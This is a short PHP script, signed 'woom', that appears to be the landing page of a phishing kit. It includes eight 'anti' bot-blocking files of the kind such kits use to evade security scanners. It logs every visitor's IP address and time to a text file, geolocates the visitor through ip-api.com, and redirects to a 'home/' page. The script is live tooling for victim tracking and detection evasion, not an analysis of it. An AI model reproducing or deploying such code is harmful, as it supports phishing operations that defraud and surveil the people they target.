<?php

/*
 woom */
    
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';


$ip = getenv("REMOTE_ADDR");


$file = fopen("v.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";




header("Location: home/");